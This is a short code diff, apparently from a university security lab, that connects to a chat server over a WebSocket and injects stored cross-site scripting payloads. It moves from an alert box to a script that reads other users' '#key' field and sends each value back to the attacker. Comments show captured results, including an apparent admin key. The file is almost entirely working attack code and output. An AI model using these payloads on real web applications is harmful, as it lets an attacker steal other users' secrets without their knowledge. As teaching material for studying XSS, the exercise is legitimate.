@@ -1,0 +1,12 @@
+var ws  = new WebSocket('ws://amplifier.ccs.neu.edu:2782/'); // Created a websocket 
+
+ws.send(JSON.stringify({author: "", text: "<script>alert('hi');</script>"})); // injected a simple script (alert)
+
+ws.send(JSON.stringify({author: "", text: "<script>alert($('#key').val());</script>"})); // injected a script which would prompt me my key
+
+ws.send(JSON.stringify({author: 'vikas', text: "<script> $( \"#key\" ).change(function() { var txt = $('#text').val(); var key = $('#key').val(); ws.send(JSON.stringify({author: 'vikas', text: txt + ' : ' + key})); }); </script>"})); // script which fetched me keys of different users and the admin
+
+// result  I: received {"author":"vikas","text":" : dada"}
+// result  I: received {"author":"vikas","text":"Good work! : gOUh3ujK3ChRw8MF"}
+
+
